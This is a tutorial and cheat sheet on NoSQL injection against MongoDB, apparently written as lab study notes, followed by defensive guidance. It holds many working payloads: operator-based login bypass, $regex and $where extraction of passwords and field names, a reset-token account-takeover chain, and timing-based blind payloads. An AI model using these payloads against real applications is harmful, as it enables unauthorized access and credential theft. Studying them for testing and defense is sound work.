# NoSQL Injection 

## Table of Contents

1. [NoSQL Databases — Foundation](#1-nosql-databases--foundation)
2. [What is NoSQL Injection?](#2-what-is-nosql-injection)
3. [How It Works — The Core Mechanic](#3-how-it-works--the-core-mechanic)
4. [Two Types of NoSQL Injection](#4-two-types-of-nosql-injection)
5. [Syntax Injection — Detection & Exploitation](#5-syntax-injection--detection--exploitation)
   - 5.1 [Detecting Syntax Injection](#51-detecting-syntax-injection)
   - 5.2 [Confirming Boolean Control](#52-confirming-boolean-control)
   - 5.3 [Overriding Conditions (Auth Bypass)](#53-overriding-conditions-auth-bypass)
   - 5.4 [Null Byte Truncation](#54-null-byte-truncation)
   - 5.5 [JavaScript Injection for Data Exfiltration](#55-javascript-injection-for-data-exfiltration)
6. [Operator Injection — Detection & Exploitation](#6-operator-injection--detection--exploitation)
   - 6.1 [Injecting Operators](#61-injecting-operators)
   - 6.2 [Authentication Bypass via Operators](#62-authentication-bypass-via-operators)
   - 6.3 [Data Extraction via `$regex`](#63-data-extraction-via-regex)
   - 6.4 [Field Name Enumeration via `$where` + `Object.keys()`](#64-field-name-enumeration-via-where--objectkeys)
   - 6.5 [Unknown Field Exfiltration — Full Chain](#65-unknown-field-exfiltration--full-chain)
7. [Timing-Based Blind Injection](#7-timing-based-blind-injection)
8. [Detection Methodology](#8-detection-methodology)
9. [Impact Assessment](#9-impact-assessment)
10. [Defense & Prevention](#10-defense--prevention)
11. [Quick Reference Cheat Sheet](#11-quick-reference-cheat-sheet)

---

## 1. NoSQL Databases — Foundation

### What is a NoSQL Database?

NoSQL ("Not Only SQL") databases store and retrieve data in formats other than the traditional relational table model. They were built to handle large volumes of unstructured or semi-structured data with greater flexibility and horizontal scalability than relational databases.

Unlike SQL databases, **there is no universal query language** — each NoSQL database uses its own query format, often JSON-based or custom APIs. This means injection techniques are different per database type, and more varied than classic SQL injection.

### Types of NoSQL Databases

| Type | Storage Format | Query Style | Examples |
|------|---------------|-------------|---------|
| **Document stores** | JSON, BSON, XML documents | JSON query API / custom language | MongoDB, Couchbase |
| **Key-value stores** | Simple key → value pairs | Key lookup | Redis, Amazon DynamoDB |
| **Wide-column stores** | Column families (flexible rows) | CQL (Cassandra Query Language) | Apache Cassandra, HBase |
| **Graph databases** | Nodes + edges (relationships) | Graph traversal query | Neo4j, Amazon Neptune |

**Security focus:** Document stores — especially **MongoDB** — are the most commonly encountered in web applications and the most frequently exploited. The rest of these notes focus primarily on MongoDB.

### Key Differences from SQL (Security Relevant)

| Property | SQL | NoSQL (MongoDB) |
|----------|-----|----------------|
| Query language | Standardized SQL | JSON-based, JavaScript-evaluated |
| Schema | Fixed, enforced | Flexible, semi-structured — fields vary per document |
| Relational constraints | Foreign keys, joins, integrity checks | Fewer — documents are self-contained |
| Server-side evaluation | Stored procedures (limited) | Full JavaScript engine (`$where`, `mapReduce`) |
| Injection format | String-based SQL syntax | JSON operators, JavaScript expressions |

The **built-in JavaScript engine** in MongoDB is the most dangerous feature from a security perspective — it allows certain operators to evaluate arbitrary JS code server-side.

---

## 2. What is NoSQL Injection?

NoSQL injection is a vulnerability where an attacker **interferes with the queries an application makes to a NoSQL database** by injecting malicious data or operators that alter the query's logic or structure.

### What an Attacker Can Achieve

- **Authentication bypass** — log in without valid credentials
- **Data extraction** — read fields the query was never meant to return
- **Data modification** — update or delete records
- **Denial of service** — crash the database or cause resource exhaustion
- **Server-side code execution** — via MongoDB's JavaScript evaluation (`$where`)

### Simple Analogy

In SQL injection, you break out of a string and append your own SQL. In NoSQL injection, the "language" you're breaking into is a **JSON document structure** or a **MongoDB operator**. Instead of appending `OR 1=1--`, you inject a JSON object like `{"$ne":"invalid"}` that replaces the expected string value with a query operator that changes the condition entirely. The database obediently processes it — it can't tell the difference between a legitimate operator sent by the app and one injected by an attacker.

---

## 3. How It Works — The Core Mechanic

### The Root Cause

The vulnerability exists when **user input is embedded directly into a database query** without sanitization. This is structurally identical to SQL injection's root cause, but the mechanics are different because NoSQL queries are built from JSON/JavaScript rather than SQL strings.

### Normal vs Injected Query (MongoDB)

**Normal product lookup:**
```
URL:   /product/lookup?category=fizzy

MongoDB query built by app:
this.category == 'fizzy'

→ Returns all documents where category field equals "fizzy"
```

**Injected query:**
```
URL:   /product/lookup?category=fizzy'||'1'=='1

MongoDB query built by app:
this.category == 'fizzy'||'1'=='1'

→ '1'=='1' always evaluates to true
→ Returns ALL documents regardless of category
```

### Query Flow

```
User Input
    │
    ▼
Application builds query string/object
    │  ← injection point: user data concatenated in here
    ▼
MongoDB receives query
    │
    ▼
MongoDB JavaScript engine evaluates expression
    │
    ▼
Returns matched documents → application returns to user
```

The attack surface is the gap between **application builds query** and **MongoDB evaluates it** — if user data enters the query unfiltered, it becomes part of the query's logic.

---

## 4. Two Types of NoSQL Injection

| Type | Mechanism | Analogy to SQL |
|------|-----------|---------------|
| **Syntax injection** | Break the query syntax to inject your own JavaScript/query logic | Like escaping a SQL string and appending your own SQL |
| **Operator injection** | Replace a data value with a MongoDB query operator object | Like injecting a SQL keyword/clause where a value was expected |

Both types can bypass authentication, extract data, and enumerate the database — but they require different conditions and use different payloads.

---

## 5. Syntax Injection — Detection & Exploitation

Syntax injection exploits the fact that user input is **concatenated into a JavaScript/query expression**, allowing you to break the syntax and inject your own logic.

### 5.1 Detecting Syntax Injection

**Step 1 — Fuzz with metacharacters:**

Submit the MongoDB fuzz string to any input that may reach the database:
```
'"`{;$Foo}$Foo \xYZ
```

URL-encoded form:
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

JSON body form (if input is in JSON):
```
'"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

**What to look for:** Any change in the response compared to normal — error message, different content, different status code. A JavaScript syntax error confirms the input is being evaluated.

**Step 2 — Test individual characters:**

Inject a single `'` to see if it breaks the query:
```
/product/lookup?category='
```

Expected query produced:
```javascript
this.category == '''    // unbalanced quotes → syntax error
```

If you get an error → the `'` character is breaking the query → injection point confirmed.

**Step 3 — Verify with escape:**

Now escape the quote to confirm the injection is JavaScript-context:
```
/product/lookup?category=\'
```

Produced query:
```javascript
this.category == '\''   // valid — escaped quote inside string
```

If **no error** this time → the app is processing the string as JavaScript → vulnerable to syntax injection.

---

### 5.2 Confirming Boolean Control

Once syntax injection is confirmed, test whether you can **influence the query's boolean logic** — this is the foundation of all further exploitation.

**False condition payload:**
```
category=fizzy'+&&+0+&&+'x
```
Produced query:
```javascript
this.category == 'fizzy' && 0 && 'x'
// → always false → no products returned
```

**True condition payload:**
```
category=fizzy'+&&+1+&&+'x
```
Produced query:
```javascript
this.category == 'fizzy' && 1 && 'x'
// → evaluates to true → normal products returned
```

**What different responses confirm:**
- False condition → empty/error response
- True condition → normal response

This means you can **control the truthiness of the query** → boolean-based data extraction is possible.

---

### 5.3 Overriding Conditions (Auth Bypass)

Inject a condition that **always evaluates to true** to override query restrictions and return all records.

**Always-true payload:**
```
category=fizzy'||'1'=='1
```

Produced query:
```javascript
this.category == 'fizzy'||'1'=='1'
// → '1'=='1' is always true → OR makes entire expression true
// → ALL documents in collection returned
```

**Effect:** Bypasses category filtering → reveals unreleased, hidden, or restricted products.

**Null byte variant — truncate trailing conditions:**

Some MongoDB versions ignore everything after a null byte (`\u0000`). If the app appends additional conditions to your query (like `this.released == 1`), you can truncate them:

```
category=fizzy'%00
```

Produced query (app sees):
```javascript
this.category == 'fizzy'\u0000' && this.released == 1'
```

MongoDB processes only up to the null byte:
```javascript
this.category == 'fizzy'
// → this.released == 1 is ignored → unreleased products visible
```

> **Warning:** Always-true conditions injected into queries that also handle UPDATE or DELETE operations can cause mass data modification or deletion. Be careful in production environments.

---

### 5.4 Null Byte Truncation

The null byte technique works specifically when:
- MongoDB is processing the query up to the null byte and discarding the rest
- The application appends additional security conditions after the attacker's input

This is effectively a "comment out the rest" technique — equivalent to `--` in SQL injection.

```
Injection:  category=fizzy'%00
App query:  this.category == 'fizzy'[NUL] && this.released == 1
DB sees:    this.category == 'fizzy'
```

Test for this by checking if unreleased/restricted items appear in results after injecting `'%00`.

---

### 5.5 JavaScript Injection for Data Exfiltration

When the query uses JavaScript-evaluating operators like `$where`, you can inject arbitrary JavaScript to **read fields character by character**.

**Scenario — user lookup endpoint:**
```
GET /user/lookup?username=admin

MongoDB query:
{"$where":"this.username == 'admin'"}
```

**Character-by-character password extraction:**
```javascript
// Test if first character of password is 'a':
admin' && this.password[0] == 'a' || 'a'=='b

// Full query becomes:
{"$where":"this.username == 'admin' && this.password[0] == 'a' || 'a'=='b"}
```

- If password starts with `'a'` → true condition → user data returned
- If password starts with something else → false condition → error/empty

Repeat for every character at every index position until the full value is extracted.

**Using `match()` with regex for smarter extraction:**
```javascript
// Check if password contains any digit:
admin' && this.password.match(/\d/) || 'a'=='b

// Check if password starts with characters a-f (binary search style):
admin' && this.password.match(/^[a-f]/) || 'a'=='b
```

`match()` enables **pattern-based** extraction — faster than brute-forcing character by character when you can narrow down character sets.

**Field name discovery (before you know what fields exist):**
```javascript
// Does a 'password' field exist on this document?
admin' && this.password!='

// Compare against a known-existing field (username):
admin' && this.username!='    // → user returned (field exists)

// Compare against a made-up field:
admin' && this.foo!='         // → error/empty (field doesn't exist)
```

If `this.password!='` produces the same response as `this.username!='` → `password` field exists. Use a wordlist and Burp Intruder to enumerate field names this way.

---

## 6. Operator Injection — Detection & Exploitation

Operator injection replaces a **data value** in the query with a **MongoDB query operator object**. Instead of expecting a string, the database receives an operator like `{"$ne":""}` and evaluates it as query logic.

### 6.1 Injecting Operators

**JSON body (most direct):**

Normal:
```json
{"username":"wiener","password":"peter"}
```

Injected (replace string value with operator object):
```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

**URL parameter injection:**

Normal:
```
username=wiener
```

Injected:
```
username[$ne]=invalid
```

The `[$ne]` bracket notation is how PHP (and some frameworks) parse nested objects from URL parameters — it becomes `{"username":{"$ne":"invalid"}}` in the parsed body.

**If URL injection doesn't work — switch to JSON:**
1. Change request method to `POST`
2. Set `Content-Type: application/json`
3. Move parameters to JSON body
4. Inject operators in the JSON

The **Content Type Converter** Burp extension automates this conversion.

### Common MongoDB Operators

| Operator | Meaning | Injection Use |
|----------|---------|--------------|
| `$ne` | Not equal | Match anything other than a specific value — bypass exact-match checks |
| `$gt` | Greater than | Condition always true if value is empty string or very low |
| `$lt` | Less than | Similar — force conditions true |
| `$in` | Match any in array | Test multiple usernames/values at once |
| `$regex` | Regular expression match | Extract data character by character |
| `$where` | JavaScript expression | Full JS code execution against document |
| `$exists` | Field existence check | Enumerate what fields a document has |

---

### 6.2 Authentication Bypass via Operators

**Goal:** Log in without knowing the password (or targeting a specific user).

**Bypass — any user, any password:**
```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

- `$ne:"invalid"` matches every username that isn't literally "invalid" → all users
- `$ne:"invalid"` for password → matches everyone whose password isn't "invalid"
- Result: logs in as the **first user in the collection** (often admin)

**Target a specific account by name:**
```json
{"username":"administrator","password":{"$ne":""}}
```

- Username must be exactly "administrator"
- Password just can't be empty → matches regardless of actual password

**Target one of several admin-like usernames:**
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

- `$in` operator tests all three usernames in one query
- First one that exists in the DB gets matched → logged in as that user

**Target using regex (partial username match):**
```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

Matches any username beginning with "admin" — useful when you don't know the exact admin username.

---

### 6.3 Data Extraction via `$regex`

**When `$where` is unavailable** (blocked or not used by the app), use `$regex` to extract data character by character by testing pattern matches.

**Confirm `$regex` is processed:**
```json
{"username":"admin","password":{"$regex":"^.*"}}
```

`^.*` matches any string → if this logs you in when the correct password wouldn't → `$regex` is being evaluated.

**Extract password character by character:**
```json
{"username":"admin","password":{"$regex":"^a.*"}}
```

- If response = login success → password begins with `a`
- If response = login failure → try next character

```json
{"username":"admin","password":{"$regex":"^ab.*"}}   // second char = 'b'?
{"username":"admin","password":{"$regex":"^abc.*"}}  // third char = 'c'?
```

Automate with Burp Intruder — cluster bomb attack, position 1 = character index, position 2 = character value. Sort by response length/status to identify successful matches.

---

### 6.4 Field Name Enumeration via `$where` + `Object.keys()`

**When you don't know what fields exist** in a MongoDB document, inject JavaScript using `$where` + `Object.keys()` to read the field names directly.

**Confirm `$where` evaluates JavaScript:**
```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"0"}
→ Response A (false condition)

{"username":"carlos","password":{"$ne":"invalid"}, "$where":"1"}
→ Response B (true condition)
```

Different responses → `$where` JavaScript is being evaluated.

**Extract first field name, first character:**
```javascript
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

- `Object.keys(this)` → returns array of all field names on the current document
- `[0]` → first field name
- `.match('^.{0}a.*')` → does the string starting at position 0 have `a` as the first character?

**Pattern explained:**
```
'^.{N}X.*'
    │  │
    │  └── character to test (A-Z, a-z, 0-9)
    └───── skip N characters (position index)
```

For each position N, cycle through all characters. When `match()` returns true (different response) → you've found the character at that position. Reconstruct the full field name character by character.

**Move to next field:**
```javascript
"$where":"Object.keys(this)[1].match('^.{0}a.*')"   // second field
"$where":"Object.keys(this)[2].match('^.{0}a.*')"   // third field
```

Automate with Burp Intruder **cluster bomb** — position 1 = character position (0–20), position 2 = character value (a-z, A-Z, 0-9).

---

### 6.5 Unknown Field Exfiltration — Full Chain

This is the most advanced technique — extracting data from a field whose name you don't even know exists. The attack chain has three stages.

**Stage 1 — Identify the target account is injectable:**
```json
{"username":"carlos","password":{"$ne":"invalid"}}
→ "Account locked" (not "Invalid credentials") → account exists + operator accepted
```

**Stage 2 — Enumerate unknown field names via `$where` + `Object.keys()`:**

Use the character-by-character technique from Section 6.4. Example: you discover a field called `passwordResetToken`.

**Stage 3 — Confirm the field is accessible via a different endpoint:**

Test the discovered field name as a URL parameter on related endpoints:
```
GET /forgot-password?passwordResetToken=invalid
→ "Invalid token" error (not "parameter not found") → field name is correct, endpoint accepts it
```

**Stage 4 — Extract the token value:**
```javascript
"$where":"this.passwordResetToken.match('^.{0}a.*')"
```

Repeat the character extraction process — this time on the token's *value* rather than its name. Extract character by character until you have the full token.

**Stage 5 — Use the token:**
```
GET /forgot-password?passwordResetToken=<extracted_value>
→ Password reset form → set new password → account takeover
```

This entire chain requires no knowledge of the schema, no access to emails, and no prior authentication. The only requirement is a `$where`-injectable endpoint.

---

## 7. Timing-Based Blind Injection

When the application returns identical responses for true and false conditions (fully blind), use **time delays** to distinguish them.

**Baseline:** Load the page multiple times to determine the normal response time.

**Inject a time delay:**
```json
{"$where": "sleep(5000)"}
```

If the response takes ~5 extra seconds → injection is working.

**Conditional time delay — exfiltrate data blind:**

```javascript
// Delay only if first character of password is 'a':
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000); while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

Or more concisely:
```javascript
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

**How to read the results:**
- Response takes ~5 extra seconds → condition is true (that character matches)
- Response returns immediately → condition is false (try next character)

This is **time-based blind injection** — slower than boolean-based but works when no response difference exists.

**Automate with Burp Intruder:**
- Inject the payload with a variable character
- Set a resource pool with a long timeout
- Sort results by response time — slowest = true condition = matched character

---

## 8. Detection Methodology

### Step 1 — Identify Potential Injection Points

Look for:
- Any parameter passed to a search, filter, or lookup (category, username, user ID, search term)
- Login forms (username/password)
- URL parameters that appear to query collections (`?user=`, `?id=`, `?category=`)
- JSON bodies in API requests (especially POST to login or search endpoints)

### Step 2 — Fuzz for Syntax Errors

Submit the MongoDB fuzz string in every parameter:
```
'"`{;$Foo}$Foo \xYZ
```

Watch for:
- JavaScript syntax errors in the response
- Any change in behavior compared to a normal request
- Error messages mentioning MongoDB, JavaScript, or query parsing

### Step 3 — Test for Operator Acceptance

In JSON parameters, try replacing string values with operator objects:
```json
{"username":{"$ne":"invalid"}}   // does this change behavior vs "username":"invalid"?
```

In URL parameters:
```
username[$ne]=invalid             // does this change behavior vs username=invalid?
```

### Step 4 — Confirm Boolean Control

Test false and true conditions:
```
category=test' && 0 && 'x     → expect: no results / error
category=test' && 1 && 'x     → expect: normal results
```

If responses differ → boolean control confirmed → extraction is possible.

### Step 5 — Probe for JavaScript Evaluation

Inject `$where` as an additional parameter:
```json
{"username":"wiener","password":"peter","$where":"0"}  → Response A
{"username":"wiener","password":"peter","$where":"1"}  → Response B
```

Different responses → JavaScript evaluation confirmed → `Object.keys()` field enumeration and full JS injection are viable.

---

## 9. Impact Assessment

| Technique | What It Achieves |
|-----------|-----------------|
| Always-true condition | View all records regardless of access control — unreleased products, all users |
| Null byte truncation | Bypass additional query conditions appended by the app |
| Operator auth bypass | Log in as any user, including admin, without knowing passwords |
| `$regex` extraction | Extract any field value character by character |
| `$where` JS injection | Full JavaScript execution — extract any field, enumerate schema, conditional logic |
| Field name enumeration | Map the entire document schema without source code access |
| Unknown field exfiltration | Account takeover via stolen password reset tokens or similar secrets |
| Timing-based injection | All of the above but in a fully blind scenario (identical responses) |

### Escalation Path

```
NoSQL Injection Confirmed
    │
    ├── Auth bypass → admin account access → application takeover
    │
    ├── Data extraction
    │    ├── Enumerate all users → credential exposure
    │    ├── Extract password reset tokens → account takeover for any user
    │    └── Extract API keys, secrets from document fields
    │
    ├── $where JavaScript → read environment, chain to other vulnerabilities
    │
    └── Schema enumeration → map internal data model → targeted further attacks
```

---

## 10. Defense & Prevention

### Primary Defense — Parameterized Queries / Safe Query APIs

Never concatenate user input directly into a query. Use the database driver's safe query construction methods that treat user input as **data**, not **query logic**.

```javascript
// VULNERABLE — string concatenation
db.products.find({$where: "this.category == '" + userInput + "'"})

// SAFE — parameterized field matching (no JS evaluation)
db.products.find({ category: userInput })
```

Using simple field-matching queries (`find({field: value})`) instead of `$where` eliminates the JavaScript injection surface entirely.

### Defense 2 — Disable `$where` and JavaScript Operators

MongoDB allows disabling server-side JavaScript execution entirely at the database level:

```
mongod --noscripting
```

Or in the config file:
```yaml
security:
  javascriptEnabled: false
```

This prevents `$where`, `$function`, and `mapReduce()` from executing JavaScript — closes the most dangerous injection surface. Apply this if the application doesn't require JavaScript evaluation in queries (most don't).

### Defense 3 — Allowlist of Accepted Operators

To prevent operator injection, validate that the value of each parameter is the expected type — reject objects where strings are expected:

```javascript
function sanitize(input) {
    if (typeof input !== 'string') {
        throw new Error('Invalid input type');
    }
    return input;
}
// Rejects {"$ne":"invalid"} because it's an object, not a string
```

Apply an allowlist of accepted keys for any JSON body parameters — reject any key that is not in the expected set of field names.

### Defense 4 — Input Validation & Sanitization

- Validate inputs against an allowlist of accepted characters (alphanumeric + limited special chars)
- Reject inputs containing MongoDB special characters: `$`, `{`, `}`, `'`, `` ` ``, `\x00`
- Validate data types — if a field expects an integer, reject non-integer input

This is a mitigation, not a fix — it reduces attack surface but skilled attackers can often bypass character blacklists.

### Defense 5 — Least Privilege on the Database

The MongoDB user account used by the application should only have permissions it actually needs:
- Read-only access for search/filter operations
- Write access only to collections that require it
- No admin or `dbAdmin` roles unless absolutely necessary

If an attacker achieves injection, least privilege limits what they can read or modify.

### Defense 6 — Suppress Error Messages

Error messages that return JavaScript syntax errors or MongoDB-specific exceptions directly help attackers confirm injection and fingerprint the database. Return generic error messages to users and log detailed errors server-side.

---

## 11. Quick Reference Cheat Sheet

### Fuzz String (MongoDB)

```
URL-encoded:  '%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
JSON context: '"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Syntax Injection Payloads

```javascript
// Confirm injection (break syntax)
'

// Confirm JS context (escape to fix)
\'

// Boolean false
' && 0 && 'x

// Boolean true
' && 1 && 'x

// Always-true override (return all records)
'||'1'=='1
Gifts'||1||'

// Null byte truncation (strip trailing conditions)
category=fizzy'%00
```

### Operator Injection Payloads

```json
// Auth bypass — any user
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

// Auth bypass — target specific account
{"username":"administrator","password":{"$ne":""}}

// Auth bypass — try multiple admin usernames
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

// Auth bypass — regex username match
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}

// Regex data extraction — first char of password
{"username":"admin","password":{"$regex":"^a.*"}}

// Confirm $where evaluation
{"username":"wiener","password":"peter","$where":"0"}   // → Response A
{"username":"wiener","password":"peter","$where":"1"}   // → Response B
```

### URL Parameter Operator Injection

```
username[$ne]=invalid
username[$regex]=admin.*
username[$in][]=admin&username[$in][]=administrator
password[$ne]=
```

### `$where` JavaScript Payloads

```javascript
// Extract password character by character
admin' && this.password[0] == 'a' || 'a'=='b
admin' && this.password[1] == 'b' || 'a'=='b

// Regex-based extraction (smarter)
admin' && this.password.match(/^a.*/) || 'a'=='b

// Field existence check
admin' && this.password!='

// Enumerate field names via Object.keys()
"$where":"Object.keys(this)[0].match('^.{0}a.*')"    // field 0, char 0 = 'a'?
"$where":"Object.keys(this)[1].match('^.{2}c.*')"    // field 1, char 2 = 'c'?

// Extract specific field value (once name is known)
"$where":"this.resetToken.match('^.{0}a.*')"
```

### Timing-Based Blind Payloads

```javascript
// Unconditional delay (confirm injection)
{"$where": "sleep(5000)"}

// Conditional delay (extract data blind)
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

### Detection Decision Tree

```
Does the parameter reach a MongoDB query?
├── Inject ' → syntax error? → Syntax injection possible
│   ├── Test && 0 && / && 1 && → different responses?
│   │   ├── Yes → boolean control confirmed → character extraction viable
│   │   └── No  → try null byte (%00) truncation
│   │
│   └── Inject $where:0 vs $where:1 → different responses?
│       ├── Yes → JS evaluation confirmed → Object.keys() + full extraction
│       └── No  → try timing-based blind injection
│
└── Inject {"$ne":"invalid"} → behavior change? → Operator injection possible
    ├── Try auth bypass operators
    ├── Try $regex for char-by-char extraction
    └── Try $where as additional parameter → JS evaluation?
```

### Burp Intruder Setup for Character Extraction

```
Attack type: Cluster bomb
Position 1: character index (numbers 0–N)
Position 2: character value (a-z, A-Z, 0-9)

Payload pattern:
  Syntax:   administrator' && this.password[§0§]=='§a§' || 'x'=='y
  Operator: {"$where":"this.password.match('^.{§0§}§a§.*')"}

Success indicator: different response length / status code
Sort by: Payload 1 → Length
```